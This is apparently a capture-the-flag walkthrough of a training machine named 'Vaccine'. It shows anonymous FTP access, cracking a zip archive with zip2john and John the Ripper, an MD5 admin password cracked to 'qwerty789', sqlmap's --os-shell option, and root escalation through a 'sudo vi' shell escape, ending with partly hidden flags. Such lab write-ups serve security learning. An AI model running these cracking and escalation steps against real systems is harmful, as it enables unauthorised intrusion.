#### Task1: Besides SSH and HTTP, what other service is hosted on this box?
```html
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
```
Answer: **FTP**
#### Task 2: This service can be configured to allow login with any password for specific username. What is that username?
Answer: **Anonymous**
#### Task 3: What is the name of the file downloaded over this service?
```html
tp> ls
229 Entering Extended Passive Mode (|||10915|)
150 Here comes the directory listing.
-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
```
Answer: **backup.zip**
#### Task 4: What script comes with the John The Ripper toolset and generates a hash from a password protected zip archive in a format to allow for cracking attempts?

Answer: **zip2john**
#### Task 5: What is the password for the admin user on the website?
```html
ftp> get backup.zip
local: backup.zip remote: backup.zip
229 Entering Extended Passive Mode (|||10746|)
150 Opening BINARY mode data connection for backup.zip (2533 bytes).
100% |***********************************|  2533        1.08 MiB/s    00:00 ETA
226 Transfer complete.
```
```html
zip2john backup.zip > hash.txt
```
```html
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
OUTPUT:
```html
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
741852963        (backup.zip)     

```
We open the file and we can see:
<img width="1036" height="27" alt="obraz" src="https://github.com/user-attachments/assets/6d2e472e-95be-4e22-8ac1-6de56f20eb38" />
After out decrypt we get: 
2cb42f8734ea607eefed3b70af13bbd3 : qwerty789

Answer: **qwerty789**

#### Task 6: What option can be passed to sqlmap to try to get command execution via the sql injection?
**--os-shell**
#### Task 7: What program can the postgres user run as root using sudo?
Answer: **vi**
#### Task 8: 
```html
postgres@vaccine:/var/lib/postgresql$ cat user.txt
\cat user.txt
ec9b13ca4d622----------980965bf7
```
<img width="669" height="75" alt="obraz" src="https://github.com/user-attachments/assets/74999a44-6c57-4994-9755-fc5fac40134c" />

#### Task 9:
Using vi as root we can type coomand
```html
:!/bin/bash -i
```
And then the flag was readen:
```html
cat /root/root.txt
dd6e058e81----------bbdef2715849
```
<img width="627" height="77" alt="obraz" src="https://github.com/user-attachments/assets/62cdc5ff-de9e-4d9e-a6d9-c141dc24038f" />


Congratulations!!!!

